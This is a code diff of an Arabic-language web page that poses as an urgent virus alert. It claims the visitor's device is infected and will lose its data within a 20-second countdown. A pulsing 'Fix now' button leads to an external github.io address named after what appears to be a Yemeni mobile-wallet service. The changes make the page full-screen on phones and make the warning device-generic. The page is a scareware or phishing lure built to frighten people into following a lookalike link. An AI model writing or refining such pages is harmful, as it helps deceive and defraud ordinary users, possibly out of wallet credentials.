@@ -2,30 +2,53 @@
 <html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>⚠️ تنبيه الفيروسات ⚠️</title>
     <style>
-      body {
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html, body {
+        height: 100%;
+        width: 100%;
         background-color: black;
         color: red;
-        text-align: center;
         font-family: Arial, sans-serif;
-        margin-top: 100px;
-        transition: background-color 0.2s;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        overflow: hidden;
+      }
+
+      h1 {
+        font-size: 7vw;
+        margin-bottom: 20px;
+      }
+
+      p {
+        font-size: 5vw;
+        margin: 10px 0;
       }
 
       #countdown {
-        font-size: 24px;
-        margin: 20px 0;
+        font-size: 6vw;
+        font-weight: bold;
       }
 
       button {
-        padding: 10px 20px;
-        font-size: 18px;
+        margin-top: 30px;
+        padding: 15px 30px;
+        font-size: 5vw;
         cursor: pointer;
         background-color: red;
         color: white;
         border: none;
-        border-radius: 5px;
+        border-radius: 10px;
         animation: pulse 1s infinite;
       }
 
@@ -47,7 +70,7 @@
   </head>
   <body>
     <h1>⚠️ تنبيه أمني خطير ⚠️</h1>
-    <p>جهاز Android الخاص بك مصاب!</p>
+    <p>جهازك  الخاص بك مصاب!</p>
     <p>إذا لم يتم إصلاحه في <span id="countdown">20</span> ثانية، ستفقد بياناتك!</p>
 
     <button onclick="window.location.href='https://sn4a5s6h.github.io/jawali.com.ye/'">إصلاح الآن</button>
